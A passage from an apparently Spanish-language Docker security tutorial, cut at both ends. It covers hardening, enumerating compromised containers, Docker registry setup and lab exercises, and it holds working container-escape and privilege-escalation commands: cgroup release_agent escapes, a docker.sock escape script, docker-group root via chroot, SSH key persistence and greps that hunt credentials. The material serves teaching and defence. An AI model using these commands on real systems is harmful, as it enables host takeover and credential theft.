FROM kalilinux/kali-rolling
RUN apt update && \
    apt install -y --no-install-recommends \
        nmap \
        sqlmap \
        hydra \
        john \
        gobuster \
        dirb \
        && \
    rm -rf /var/lib/apt/lists/*

# Este Dockerfile build con algunos GTs:
# docker build -t kali-pentest .
# docker run --rm -it --network host -v $(pwd):/data kali-pentest
```

---

## 8) [docker](../raw/d0ck3r-f0r-h4ck3rs.md) Security

### 8.1 USER: correr como non-root

```dockerfile
# SIEMPRE correr containers como non-root

# MAL:
FROM nginx
# corre como root por defecto

# BIEN:
FROM nginx
RUN groupadd -r myuser && useradd -r -g myuser myuser
USER myuser

# MEJOR: usar imágenes que ya corren como non-root
FROM nginxinc/nginx-unprivileged:alpine
# Expone en puerto 8080 (no 80, porque no es root)
```

```bash
# Verificar usuario en container:
docker run --rm alpine whoami

# User namespace remapping (sandboxing a nivel host):
dockerd --userns-remap=default
# O en /etc/docker/daemon.json:
# {
#   "userns-remap": "default"
# }
```

### 8.2 Read-only rootfs

```bash
# El filesystem del container es de solo lectura
# Útil para prevenir modificaciones en runtime

docker run --read-only -v /tmp:/tmp --rm alpine sh
# Sin tmp mount, el container falla si necesita escribir algo

# Con tmpfs para directorios que necesitan escritura:
docker run --read-only --tmpfs /tmp --tmpfs /var/run alpine

# Un contenedor con rootfs read-only no puede instalar paquetes
# ni modificar archivos del sistema
```

### 8.3 Dropping [capabilities](../raw/l1n9x-pr1v3sc.md#linux-capabilities)

Linux capabilities dividen los privilegios de root en unidades atómicas. Docker permite agregar o eliminar capabilities.

```bash
# Ver capabilities por defecto de un container:
docker run --rm alpine grep Cap /proc/1/status

# Eliminar todas las capabilities:
docker run --cap-drop ALL alpine

# Agregar solo las necesarias:
docker run --cap-drop ALL --cap-add NET_BIND_SERVICE nginx
# NET_BIND_SERVICE: bind a puertos < 1024

# Ejemplo de capabilities peligrosas:
# CAP_SYS_ADMIN    - mount, namespace ops (container escape!)
# CAP_NET_ADMIN    - config de red (iptables, etc.)
# CAP_NET_RAW      - raw sockets (puede hacer spoofing)
# CAP_SYS_PTRACE   - ptrace (puede leer memoria de otros procesos)
# CAP_SYS_MODULE   - cargar módulos del kernel (escape!)
# CAP_DAC_OVERRIDE - bypass de permisos de archivos

# Dockerfile:
# No se puede settar en Dockerfile, solo en runtime:
# docker run --cap-drop ALL --cap-add NET_BIND_SERVICE ...
```

### 8.4 Seccomp profiles

Seccomp filtra syscalls del [kernel](../raw/0s-f0nd4m3nt0s.md#kernel). Docker tiene un profile por defecto que bloquea ~50 syscalls peligrosas.

```bash
# Usar seccomp default (ya activo)
docker run alpine unshare --help
# Esto falla porque unshare() está en la blacklist

# Deshabilitar seccomp (NO RECOMENDADO):
docker run --security-opt seccomp=unconfined alpine unshare --help
# Funciona, pero peligroso

# Crear profile custom:
cat > custom-seccomp.json << 'EOF'
{
    "defaultAction": "SCMP_ACT_ERRNO",
    "architectures": ["SCMP_ARCH_X86_64"],
    "syscalls": [
        {
            "names": ["read", "write", "open", "close", "mmap", "mprotect",
                      "socket", "connect", "accept", "bind", "listen",
                      "clone", "fork", "vfork", "execve", "exit", "exit_group"],
            "action": "SCMP_ACT_ALLOW"
        }
    ]
}
EOF
docker run --security-opt seccomp=custom-seccomp.json alpine sh
```

### 8.5 AppArmor

AppArmor es un LSM (Linux Security Module) que restringe programas específicos.

```bash
# Ver perfil default de Docker
sudo aa-status | grep docker

# Usar perfil custom:
docker run --security-opt apparmor=my-docker-profile nginx

# Ejemplo de perfil AppArmor:
# /etc/apparmor.d/docker-my-profile
#include <tunables/global>
profile docker-my-profile flags=(attach_disconnected) {
  #include <abstractions/base>
  
  network,
  capability,
  file,
  umount,
  
  # Denegar mount
  deny mount,
  
  # Denegar acceso a /proc
  deny /proc/** w,
  deny /sys/** w,
  
  # Permitir acceso a /tmp (escritura)
  /tmp/** rw,
}

# Cargar perfil
sudo apparmor_parser -r /etc/apparmor.d/docker-my-profile
```

### 8.6 Docker Bench Security

Docker Bench Security es un script de auditoría basado en los benchmarks de CIS (Center for Internet Security):

```bash
# Ejecutar Docker Bench Security
docker run --rm -it \
    --net host \
    --pid host \
    --userns host \
    --cap-add audit_control \
    -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
    -v /var/lib:/var/lib:ro \
    -v /var/run/docker.sock:/var/run/docker.sock:ro \
    -v /usr/lib/systemd:/usr/lib/systemd:ro \
    -v /etc:/etc:ro \
    docker/docker-bench-security

# Ver resultados:
# [PASS] 1.1 - Ensure a separate partition for containers...
# [WARN] 2.1 - Ensure network traffic is restricted...
# [INFO] 4.1 - Ensure A Docker user for the container has been created...
# [NOTE] 5.22 - Ensure the default seccomp profile is not disabled...
```

---

## 9) [container](../raw/d0ck3r-f0r-h4ck3rs.md#contenedores) Enumeration

Cuando comprometés un container, lo primero es enumerar qué hay.

### 9.1 Host filesystem mounts

```bash
# Buscar montajes del host
mount | grep -E "^/dev|nfs|nfs4|cifs|fuse"
cat /proc/mounts | grep -v "^cgroup\|^proc\|^sysfs\|^devpts"

# Si hay bind mounts del host:
ls -la /host    # podría estar montado acá
ls -la /mnt
ls -la /data

# Buscar docker.sock (container escape):
find / -name "docker.sock" 2>/dev/null
# /var/run/docker.sock -> container fuera de container!

# Buscar archivos del host via cgroup:
ls -la /sys/fs/cgroup/
cat /proc/1/cgroup   # ver en qué cgroup estamos
```

### 9.2 [capabilities](../raw/l1n9x-pr1v3sc.md#linux-capabilities) enumeration

```bash
# Ver capabilities del container
cat /proc/1/status | grep Cap
# CapInh: 00000000a80425fb
# CapPrm: 00000000a80425fb
# CapEff: 00000000a80425fb
# CapBnd: 00000000a80425fb

# Decodificar con capsh (dentro del container):
capsh --decode=00000000a80425fb

# O instalar libcap-ng-utils y usar:
capsh --print

# Si no tenés capsh, usar script:
cat << 'EOF' | python3
caps = {
    0: "CHOWN", 1: "DAC_OVERRIDE", 2: "DAC_READ_SEARCH",
    3: "FOWNER", 4: "FSETID", 5: "KILL",
    6: "SETGID", 7: "SETUID", 8: "SETPCAP",
    9: "LINUX_IMMUTABLE", 10: "NET_BIND_SERVICE",
    11: "NET_BROADCAST", 12: "NET_ADMIN", 13: "NET_RAW",
    14: "IPC_LOCK", 15: "IPC_OWNER", 16: "SYS_MODULE",
    17: "SYS_RAWIO", 18: "SYS_CHROOT", 19: "SYS_PTRACE",
    20: "SYS_PACCT", 21: "SYS_ADMIN", 22: "SYS_BOOT",
    23: "SYS_NICE", 24: "SYS_RESOURCE", 25: "SYS_TIME",
    26: "SYS_TTY_CONFIG", 27: "MKNOD", 28: "LEASE",
    29: "AUDIT_WRITE", 30: "AUDIT_CONTROL", 31: "SETFCAP",
    32: "MAC_OVERRIDE", 33: "MAC_ADMIN", 34: "SYSLOG",
    35: "WAKE_ALARM", 36: "BLOCK_SUSPEND", 37: "AUDIT_READ",
    38: "PERFMON", 39: "BPF", 40: "CHECKPOINT_RESTORE"
}

eff = 0x00000000a80425fb
for bit, name in caps.items():
    if eff & (1 << bit):
        print(f"[+] {name}")
EOF

# Capacidades clave para escape:
# CAP_SYS_ADMIN -> mount, namespace ops
# CAP_NET_ADMIN -> iptables dentro del container
# CAP_SYS_PTRACE -> ptrace procesos
# CAP_SYS_MODULE -> insmod módulos kernel
# CAP_NET_RAW -> raw sockets (spoofing)
```

### 9.3 cgroups y escapes

```bash
# Ver si tenemos acceso a cgroups y devices
ls -la /sys/fs/cgroup/devices/
cat /sys/fs/cgroup/devices/devices.list
# Si hay "a *:* rwm", podemos acceder a todos los dispositivos
# Esto permite mountear discos del host!

# Ver si podemos escribir en cgroups
find /sys/fs/cgroup -writable -type d 2>/dev/null
# Si encontramos un directorio writable, podemos hacer escape

# Cgroup notify_on_release exploit:
# (técnica clásica de escape)
```

**Known escape technique via cgroup:**

```bash
# Si tenemos CAP_SYS_ADMIN y acceso a cgroup notifiers:
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'cat /root/flag.txt > $host_path/output.txt' >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### 9.4 Environment variables: secrets expuestos

```bash
# Las env vars son un lugar común donde los devs dejan secrets
env
printenv
cat /proc/1/environ

# Buscar patrones comunes:
env | grep -iE "pass|secret|key|token|cred|aws|azure|gcp|api_key|PASSWORD|SECRET"

# Con un one-liner:
for var in $(env | cut -d= -f1); do
    value="${!var}"
    if [ ${#value} -gt 20 ] && [[ "$var" =~ (PASS|SECRET|KEY|TOKEN|CRED) ]]; then
        echo "[!] $var=$value"
    fi
done

# Si hay credenciales de AWS:
cat /proc/1/environ | tr '\0' '\n' | grep -E "AWS_"
# AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN
```

### 9.5 Mounted secrets

```bash
# Buscar secrets montados en directorios comunes
ls -la /run/secrets/
ls -la /etc/secrets/
ls -la /secrets/

# Buscar archivos .dockerenv
cat /.dockerenv

# Buscar archivos de configuración
find / -name "*.env" -o -name "*.secret" -o -name "*password*" \
    -o -name "*key*" -o -name "*.pem" -o -name "*.crt" \
    -o -name ".aws" -o -name ".azure" -o -name ".gcp" \
    -o -name "kube*" -o -name "*.kubeconfig" 2>/dev/null

# Buscar en home directories
cat /root/.bash_history
cat /home/*/.bash_history

# Buscar Docker config (auths)
cat /root/.docker/config.json
# Si hay credenciales de registry, se pueden usar para pull/push
```

---

## 10) Abusing [docker](../raw/d0ck3r-f0r-h4ck3rs.md)

### 10.1 [privilege escalation](../raw/l1n9x-pr1v3sc.md) via Docker group

Si un usuario está en el grupo `docker`, puede ejecutar comandos como root sin contraseña.

```bash
# En el host, verificar:
id
# uid=1000(user) gid=1000(user) groups=1000(user),999(docker)

# Escalar a root:
docker run --rm -it -v /:/host alpine sh
# Dentro del nuevo container, sos root en /host:
chroot /host
whoami  # root
cat /etc/shadow  # accedes a todo

# O más directo:
docker run --rm -it -v /:/mnt alpine chroot /mnt

# Si querés un shell interactivo como root del host:
docker run --rm -it --privileged --pid=host alpine nsenter -t 1 -m -u -i -n sh
```

### 10.2 Mounting host filesystem

```bash
# El ataque más común: montar todo el filesystem del host
docker run --rm -v /:/mnt/host alpine

# Ahora tenés acceso root a todos los archivos del host:
ls /mnt/host/etc/shadow
ls /mnt/host/root/.ssh/
cat /mnt/host/root/.ssh/authorized_keys

# Agregar tu clave SSH al host:
mkdir -p /mnt/host/root/.ssh/
echo "ssh-ed25519 AAA... tu_key" >> /mnt/host/root/.ssh/authorized_keys

# Método para modificar /etc/shadow (generar hash):
openssl passwd -6 -salt xyz MiNuevaPass
# Reemplazar root:$6$xyz... en /mnt/host/etc/shadow

# Montar docker.sock desde el host:
docker run -v /var/run/docker.sock:/var/run/docker.sock \
    -ti docker:latest sh

# Ahora tenés control de Docker desde dentro del container
```

### 10.3 Docker socket compromise

El socket de Docker (`/var/run/docker.sock`) es el canal de comunicación con el daemon. Quien tiene acceso al socket, tiene control total de Docker.

```bash
# Desde dentro de un container que tiene el socket montado:
ls -la /var/run/docker.sock

# Instalar docker CLI dentro del container
curl -fsSL https://get.docker.com | sh
# (o copiar el binario del host)

# Ahora corrés docker commands como si estuvieras en el host:
docker ps
docker run --rm -it -v /:/host alpine chroot /host
# ESCAPASTE!

# Sin instalar docker: usar curl contra el socket
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
curl -s --unix-socket /var/run/docker.sock \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{"Image":"alpine","Cmd":["sh"],"Binds":["/:/host"]}' \
    http://localhost/containers/create
```

**Script de escape via docker.sock:**

```bash
#!/bin/sh
# escape_docker_sock.sh - Escapar de container con docker.sock

DOCKER_SOCK=/var/run/docker.sock

if [ ! -S "$DOCKER_SOCK" ]; then
    echo "[-] No docker.sock found"
    exit 1
fi

echo "[+] Docker socket found. Escaping..."

# Crear container con / montado
PAYLOAD='{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt/host"],"Privileged":true}'

RESPONSE=$(curl -s --unix-socket "$DOCKER_SOCK" \
    -X POST \
    -H "Content-Type: application/json" \
    -d "$PAYLOAD" \
    http://localhost/containers/create)

CONTAINER_ID=$(echo "$RESPONSE" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)

echo "[+] Container ID: $CONTAINER_ID"

# Iniciar el container
curl -s --unix-socket "$DOCKER_SOCK" \
    -X POST \
    http://localhost/containers/$CONTAINER_ID/start

# Ejecutar comandos en el container de escape
curl -s --unix-socket "$DOCKER_SOCK" \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/mnt/host","whoami"]}' \
    http://localhost/containers/$CONTAINER_ID/exec
```

### 10.4 [container](../raw/d0ck3r-f0r-h4ck3rs.md#contenedores) escape techniques

**Técnica 1: SYS_ADMIN + mount**

```bash
# Si tenemos CAP_SYS_ADMIN, podemos montar el cgroup del host
# y usar notify_on_release para ejecutar comandos como root del host

# Verificar capability:
cat /proc/1/status | grep CapEff | grep -qi 0000000000000000 || echo "Has capabilities"

# Probar SYS_ADMIN específicamente:
capsh --print | grep sys_admin

# Escape:
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
HOST_PATH=$(grep -oP 'perdir=\K[^,]*' /proc/mounts | head -1)
echo "$HOST_PATH/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /root/flag.txt > $HOST_PATH/flag.txt" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
sleep 2
cat /flag.txt 2>/dev/null || echo "Espera un momento..."
```

**Técnica 2: Caracteres de dispositivo**

```bash
# Si tenemos SYS_ADMIN + acceso a /dev, podemos crear dispositivos
# y montar el filesystem del host

# Ver qué podemos hacer:
cat /proc/self/status | grep CapEff

# Crear device node para el disco del host:
mknod /dev/sda b 8 0  # primer disco SCSI
mkdir /mnt/host
mount /dev/sda /mnt/host
ls /mnt/host/root/
```

**Técnica 3: nsenter con --pid=host**

```bash
# Si tenemos --pid=host y --privileged:
nsenter --target 1 --mount --uts --ipc --net --pid -- sh
# Esto te da un namespace shell en el PID 1 del host

# También:
docker run --rm --pid=host --privileged alpine \
    nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

### 10.5 Abusing --privileged flag

```bash
# Un container con --privileged tiene:
# - Todas las capabilities
# - Acceso completo a todos los dispositivos
# - Sin seccomp
# - Sin AppArmor

# Prácticamente es root del host.

# Verificar si el container es privileged:
cat /proc/1/status | grep CapEff
# 0000003fffffffff  <- todas las capabilities

# O:
ip link add dummy0 type dummy 2>/dev/null && echo "Privileged!"

# Escapando de privileged container:
# 1. Acceder a discos del host
fdisk -l
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# 2. Cargar módulo del kernel (si tiene SYS_MODULE)
# WARNING: puede crashear el host
cat > /tmp/evil.c << 'EOF'
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

int init_module(void) {
    printk(KERN_INFO "Escape module loaded\n");
    // Aca iría el código malicioso
    return 0;
}

void cleanup_module(void) {
    printk(KERN_INFO "Escape module unloaded\n");
}
EOF

# 3. Usar nsenter para ejecutar en el namespace del host
nsenter --target 1 --mount --uts --ipc --net --pid

# 4. Usar chroot + mount:
# Ya vimos, mount del disco del host
```

---

## 11) [docker](../raw/d0ck3r-f0r-h4ck3rs.md) Registry

### 11.1 Running private registry

```bash
# Registry básico (sin autenticación, HTTP)
docker run -d -p 5000:5000 --name registry registry:2

# Registry con persistencia y HTTPS:
mkdir -p certs
openssl req -newkey rsa:4096 -nodes -sha256 \
    -keyout certs/domain.key \
    -x509 -days 365 \
    -out certs/domain.crt

docker run -d \
    -p 5000:5000 \
    --name registry \
    -v $(pwd)/certs:/certs \
    -v $(pwd)/registry_data:/var/lib/registry \
    -e REGISTRY_HTTP_TLS_CERTIFICATE=/certs/domain.crt \
    -e REGISTRY_HTTP_TLS_KEY=/certs/domain.key \
    registry:2

# Registry con autenticación básica (htpasswd):
mkdir auth
docker run --entrypoint htpasswd \
    httpd:2 -Bbn usuario contrasena > auth/htpasswd

docker run -d \
    -p 5000:5000 \
    --name registry \
    -v $(pwd)/auth:/auth \
    -e "REGISTRY_AUTH=htpasswd" \
    -e "REGISTRY_AUTH_HTPASSWD_REALM=Registry Realm" \
    -e "REGISTRY_AUTH_HTPASSWD_PATH=/auth/htpasswd" \
    registry:2
```

### 11.2 Pushing/pulling images

```bash
# Taggear imagen para registry local
docker tag alpine:latest localhost:5000/mialpine:v1
docker tag ubuntu:22.04 localhost:5000/ubuntu-dev

# Pushear
docker push localhost:5000/mialpine:v1
docker push localhost:5000/ubuntu-dev

# Pull
docker pull localhost:5000/mialpine:v1

# Registry remoto (con auth):
docker login registry.miempresa.com:5000
docker tag miapp:latest registry.miempresa.com:5000/miapp:prod
docker push registry.miempresa.com:5000/miapp:prod
```

### 11.3 Image tagging

```bash
# Tags: versionado semántico + entornos
docker tag miapp:latest registry/miapp:1.0.0
docker tag miapp:latest registry/miapp:1.0
docker tag miapp:latest registry/miapp:1
docker tag miapp:latest registry/miapp:prod

# Múltiples tags por imagen (útil para versioning)
docker tag miapp:latest registry/miapp:v1.0.0
docker tag miapp:latest registry/miapp:stable

# Convención de tags:
# latest     - última versión estable
# prod       - versión en producción
# staging    - versión en staging
# 1.0.0      - versión semántica
# sha-abc123 - build específico (por commit hash)

# Ver tags disponibles en registry (sin pull):
curl -s http://localhost:5000/v2/_catalog
curl -s http://localhost:5000/v2/mialpine/tags/list
```

### 11.4 Registry API

```bash
# Registry v2 API (REST)
# Ver catálogo
curl http://localhost:5000/v2/_catalog
# {"repositories":["mialpine","ubuntu-dev"]}

# Ver tags
curl http://localhost:5000/v2/mialpine/tags/list
# {"name":"mialpine","tags":["latest","v1"]}

# Ver manifiesto
curl -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
    http://localhost:5000/v2/mialpine/manifests/latest

# Ver capas de imagen
# (del manifiesto, extraer layer digests)
MANIFEST=$(curl -s -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
    http://localhost:5000/v2/mialpine/manifests/latest)

echo "$MANIFEST" | jq -r '.layers[].digest'
# sha256:abc123...
# sha256:def456...

# Descargar capa específica
curl -L http://localhost:5000/v2/mialpine/blobs/sha256:abc123... -o layer.tar

# Eliminar manifiesto (requiere borrado físico después)
DIGEST=$(curl -s -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
    -I http://localhost:5000/v2/mialpine/manifests/latest | \
    grep -i Docker-Content-Digest | awk '{print $2}' | tr -d '\r')
curl -X DELETE "http://localhost:5000/v2/mialpine/manifests/$DIGEST"

# Garbage collect (libera espacio)
docker exec registry bin/registry garbage-collect /etc/docker/registry/config.yml
```

### 11.5 Registry security

```bash
# NUNCA exponer registry sin HTTPS + auth

# Mejores prácticas:
# 1. HTTPS obligatorio
# 2. Autenticación (htpasswd, LDAP, OAuth)
# 3. Rate limiting
# 4. Escaneo de imágenes (Trivy, Clair)
# 5. Auditoría de push/pull

# Registry con rate limiting:
REGISTRY_MIDDLEWARE_RATELIMIT_OPTS="
    REGISTRY_MIDDLEWARE_RATELIMIT_URL=http://localhost:5000
    REGISTRY_MIDDLEWARE_RATELIMIT_RATELIMIT=100-H
"

# Proxy registry (cache de Docker Hub):
docker run -d \
    -p 5000:5000 \
    -e REGISTRY_PROXY_REMOTEURL=https://registry-1.docker.io \
    --name mirror registry:2
```

---

## 12) Ejercicios Prácticos

### 12.1 Ejercicio 1: Levantar un lab vulnerable con compose

Creá un [docker](../raw/d0ck3r-f0r-h4ck3rs.md)-compose.yml que levante DVWA + Juiceshop + WebGoat simultáneamente.

<details>
<summary>Ver solución</summary>

```yaml
version: "3.8"

services:
  dvwa:
    image: vulnerables/web-dvwa
    ports:
      - "8080:80"
    environment:
      - DB_SERVER=dvwa-db
    depends_on:
      - dvwa-db

  dvwa-db:
    image: mysql:5.7
    environment:
      MYSQL_ROOT_PASSWORD: dvwa
      MYSQL_DATABASE: dvwa

  juice-shop:
    image: bkimminich/juice-shop
    ports:
      - "3000:3000"

  webgoat:
    image: webgoat/goatandwolf
    ports:
      - "8081:8080"
      - "9091:9090"
```

```bash
# Levantar
docker compose up -d

# Abrir:
# DVWA: http://localhost:8080
# Juice Shop: http://localhost:3000
# WebGoat: http://localhost:8081/WebGoat
```
</details>

### 12.2 Ejercicio 2: Containerizar [sqlmap](../raw/w3b-h4ck1ng.md#sqlmap)

Creá un Dockerfile para SQLMap con output persistente.

<details>
<summary>Ver solución</summary>

```dockerfile
FROM python:3.11-slim

RUN pip install --no-cache-dir sqlmap

WORKDIR /workspace
VOLUME /workspace

ENTRYPOINT ["sqlmap"]
```

```bash
# Build
docker build -t my-sqlmap .

# Uso con persistencia:
docker run --rm -it \
    --network host \
    -v $(pwd)/output:/workspace \
    my-sqlmap -u "http://target.com/page?id=1" --dbs

# Alias para uso frecuente:
alias sqlmap="docker run --rm -it --network host \
    -v $(pwd)/output:/workspace my-sqlmap"
```
</details>

### 12.3 Ejercicio 3: Escalar privilegios via Docker

Suponiendo que estás en un host Linux como usuario `dev` y descubrís que está en el grupo docker. Escalá a root.

<details>
<summary>Ver solución</summary>

```bash
# 1. Verificar el grupo
id
# uid=1001(dev) gid=1001(dev) groups=1001(dev),999(docker)

# 2. Escalar a root
docker run --rm -it -v /:/host alpine chroot /host sh

# 3. Verificar
whoami  # root
id      # uid=0(root)

# 4. Crear usuario permanente (opcional)
adduser --gecos "" --disabled-password dockerscape
usermod -aG sudo dockerscape

# 5. Agregar clave SSH (para acceso futuro sin docker)
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAA... tu_clave" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# 6. Alternativa: shell interactiva vs directa
docker run --rm -it --privileged --pid=host alpine \
    nsenter -t 1 -m -u -i -n sh
```
</details>

### 12.4 Ejercicio 4: Enumerar un [container](../raw/d0ck3r-f0r-h4ck3rs.md#contenedores) comprometido

Te dan acceso a un container comprometido. Enumerá:
1. Capacidades
2. Montajes del host
3. Variables de entorno con posibles secrets
4. Docker socket
5. Intentá escapar

<details>
<summary>Ver solución</summary>

```bash
# 1. Ver capacidades
cat /proc/1/status | grep CapEff
# Si es 0000003fffffffff -> ALL (privileged)
capsh --print 2>/dev/null || echo "capsh no disponible"

# 2. Montajes
mount | grep -v "cgroup\|proc\|sysfs\|devpts\|mqueue\|shm"
cat /proc/mounts | grep -v "cgroup\|proc\|sysfs\|devpts"

# Buscar montajes del host
ls -la /host/ 2>/dev/null
ls -la /mnt/ 2>/dev/null

# 3. Variables de entorno con posibles secrets
env | grep -iE "pass|secret|key|token|cred|aws|azure|api_key"
cat /proc/1/environ 2>/dev/null | tr '\0' '\n'

# 4. Buscar docker socket
find / -name "docker.sock" 2>/dev/null
if [ -S /var/run/docker.sock ]; then
    echo "[+] Docker socket encontrado!"
    # Intentar listar containers
    docker ps 2>/dev/null || curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
fi

# 5. Intentar escape
# a) Si hay docker socket, usarlo
if [ -S /var/run/docker.sock ]; then
    docker run --rm -v /:/host alpine chroot /host whoami
fi

# b) Si es privileged, montar dispositivo
if [ -b /dev/sda ]; then
    mkdir -p /mnt/host
    mount /dev/sda /mnt/host 2>/dev/null && echo "[+] Host mounted!" || echo "[-] Mount failed"
fi

# c) Si tiene SYS_ADMIN, intentar cgroup escape
if capsh --print 2>/dev/null | grep -q sys_admin; then
    echo "[+] SYS_ADMIN encontrado - posible escape"
fi

# Resumen
echo "=== Resumen ==="
echo "Privileged: $(cat /proc/1/status | grep CapEff | grep -q 0000003fffffffff && echo SI || echo NO)"
echo "Docker Socket: $([ -S /var/run/docker.sock ] && echo SI || echo NO)"
echo "SYS_ADMIN: $(capsh --print 2>/dev/null | grep -q sys_admin && echo SI || echo NO)"
```
</details>

### 12.5 Ejercicio 5: Hardening de un Dockerfile

Dado este Dockerfile inseguro, mejorá la seguridad:

```dockerfile
FROM ubuntu:latest
RUN apt update && apt install -y nginx
COPY nginx.conf /etc/nginx/nginx.conf
COPY app /var/www/html
CMD ["nginx", "-g", "daemon off;"]
EXPOSE 80
```

<details>
<summary>Ver solución</summary>

```dockerfile
# 1. PIN versión de imagen, no latest
FROM ubuntu:22.04

# 2. Limpiar cache de apt en la misma capa, no root
RUN apt update && \
    apt install -y nginx && \
    rm -rf /var/lib/apt/lists/* && \
    rm -rf /var/log/apt/*

# 3. Copiar config y app
COPY nginx.conf /etc/nginx/nginx.conf
COPY app /var/www/html

# 4. Crear usuario no-root
RUN groupadd -r nginxuser && \
    useradd -r -g nginxuser -d /var/www -s /sbin/nologin nginxuser && \
    chown -R nginxuser:nginxuser /var/www /var/log/nginx /var/lib/nginx

# 5. NO exponer como root
USER nginxuser

# 6. Healthcheck
HEALTHCHECK --interval=30s --timeout=3s \
    CMD curl -f http://localhost:80/ || exit 1

CMD ["nginx", "-g", "daemon off;"]
EXPOSE 80
```

```bash
# Construir y correr con seguridad adicional:
docker build -t secure-nginx .
docker run -d \
    --cap-drop ALL \
    --cap-add NET_BIND_SERVICE \
    --read-only \
    --tmpfs /var/run \
    --tmpfs /var/cache/nginx \
    --security-opt seccomp=nginx-seccomp.json \
    -p 8080:80 \
    secure-nginx
```
</details>

### 12.6 Ejercicio 6: Docker socket attack

Simulá un ataque donde un container tiene acceso al docker.sock y lo usás para escapar.

<details>
<summary>Ver solución</summary>

```bash
# 1. Setup del escenario (como root del host):
docker run -d --name victim \
    -v /var/run/docker.sock:/var/run/docker.sock \
    alpine sleep infinity

# 2. Entrar al container (simulando compromiso inicial):
docker exec -it victim sh

# 3. Verificar el socket:
ls -la /var/run/docker.sock
# srw-rw---- 1 root root 0 ... /var/run/docker.sock

# 4. Instalar docker CLI (o usar curl):
# (usamos apk porque es alpine)
apk add --no-cache docker-cli

# 5. Ver containers:
docker ps
# CONTAINER ID   IMAGE     COMMAND            CREATED         STATUS
# abc123def456   alpine    "sleep infinity"   1 minute ago    Up 1 minute

# 6. Escalar a root del host:
docker run --rm -it -v /:/host alpine sh
# Dentro del nuevo container:
chroot /host /bin/sh
whoami
# root

# 7. Alternativa sin instalar docker CLI (solo curl):
curl -s --unix-socket /var/run/docker.sock \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"],"Privileged":true}' \
    http://localhost/containers/create

# Tomar el ID del container y arrancarlo:
curl -s --unix-socket /var/run/docker.sock \
    -X POST \
    http://localhost/containers/[CONTAINER_ID]/start

# Ejecutar comando en el nuevo container:
curl -s --unix-socket /var/run/docker.sock \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"Cmd":["chroot","/host","whoami"]}' \
    http://localhost/containers/[CONTAINER_ID]/exec

# 8. Limpiar (desde host):
docker rm -f victim
docker rm -f [NEW_CONTAINER_ID]
```
</details>

### 12.7 Ejercicio 7: Setup de registry privado con autenticación

Configurá un registry privado con [https](../raw/r3d3s-f0nd4m3nt0s.md#https) y autenticación htpasswd.

<details>
<summary>Ver solución</summary>

```bash
# 1. Directorio de trabajo
mkdir -p ~/docker-registry/{auth,certs,data}
cd ~/docker-registry

# 2. Certificado SSL autofirmado
openssl req -newkey rsa:4096 -nodes -sha256 \
    -keyout certs/domain.key \
    -x509 -days 365 \
    -subj "/C=AR/ST=CABA/L=CABA/O=HackingLab/CN=registry.local" \
    -out certs/domain.crt

# 3. Archivo htpasswd
docker run --entrypoint htpasswd \
    httpd:2 -Bbn admin MiPassword123! > auth/htpasswd

# 4. Configurar Docker daemon para aceptar certificado
# En /etc/docker/daemon.json:
# {
#   "insecure-registries": [
#     "registry.local:5000"
#   ]
# }
# systemctl restart docker

# Opcional: copiar certificado a los hosts que van a usar el registry
# sudo mkdir -p /etc/docker/certs.d/registry.local:5000
# sudo cp certs/domain.crt /etc/docker/certs.d/registry.local:5000/ca.crt

# 5. Levantar registry
docker run -d \
    -p 5000:5000 \
    --name registry \
    -v $(pwd)/certs:/certs \
    -v $(pwd)/auth:/auth \
    -v $(pwd)/data:/var/lib/registry \
    -e "REGISTRY_AUTH=htpasswd" \
    -e "REGISTRY_AUTH_HTPASSWD_REALM=Registry Realm" \
    -e "REGISTRY_AUTH_HTPASSWD_PATH=/auth/htpasswd" \
    -e "REGISTRY_HTTP_TLS_CERTIFICATE=/certs/domain.crt" \
    -e "REGISTRY_HTTP_TLS_KEY=/certs/domain.key" \
    registry:2

# 6. Login y test
docker login registry.local:5000 -u admin -p MiPassword123!
docker tag alpine registry.local:5000/test-alpine
docker push registry.local:5000/test-alpine
docker pull registry.local:5000/test-alpine

# 7. Verificar API
curl -u admin:MiPassword123! https://registry.local:5000/v2/_catalog
```
</details>

### 12.8 Ejercicio 8: Dockerscan: escanear hosts con Docker

Usá Docker para escanear hosts de una [red](../raw/r3d3s-f0nd4m3nt0s.md) usand [nmap](../raw/nm4p.md) y otras herramientas desde containers.

<details>
<summary>Ver solución</summary>

```bash
# 1. Escaneo de red completo
docker run --rm --network host --cap-add NET_RAW instrumentisto/nmap \
    -sn 192.168.1.0/24

# 2. Escaneo de puertos
docker run --rm --network host instrumentisto/nmap \
    -sS -sV -p- 192.168.1.100

# 3. Escaneo con scripts NSE (vulnerabilidades)
